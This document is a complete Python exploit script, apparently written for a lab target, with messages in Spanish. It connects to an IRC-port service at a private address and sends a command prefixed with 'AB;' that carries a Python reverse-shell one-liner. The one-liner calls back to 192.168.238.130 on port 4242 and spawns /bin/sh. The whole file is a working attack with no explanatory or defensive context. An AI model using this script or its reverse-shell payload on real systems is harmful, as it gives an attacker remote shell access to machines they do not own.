import socket 

class Exploit:

    def __init__(self, host, port):
        self.host = host
        self.port = port 
        self.sock = None
    
    def connect(self):
        try:
            self.sock = socket.create_connection((self.host, self.port))
            self.sock.recv(1024)
            return True
        except Exception as e:
            print(f"Error al connectarse a {self.host} en el puerto {self.port}: {e}")
            return False
    
    def send_command(self, command):
        try:
            self.sock.sendall(command.encode('utf-8'))
            return self.sock.recv(1024).decode('utf-8')
        except Exception as e:
            print(f"Error al enviar el comando {command}: {e}")
            return None
        
    def exploit(self):
        payload = "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.238.130\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
        respuesta = self.send_command(f"AB; {payload} \n")
        print(f"Exploit enviado. Respuesta del servicio: {respuesta}")
            
    def run(self):
        if self.connect():
            self.exploit()

if __name__ == "__main__":
    exploit = Exploit("192.168.238.131",6667)
    exploit.run()

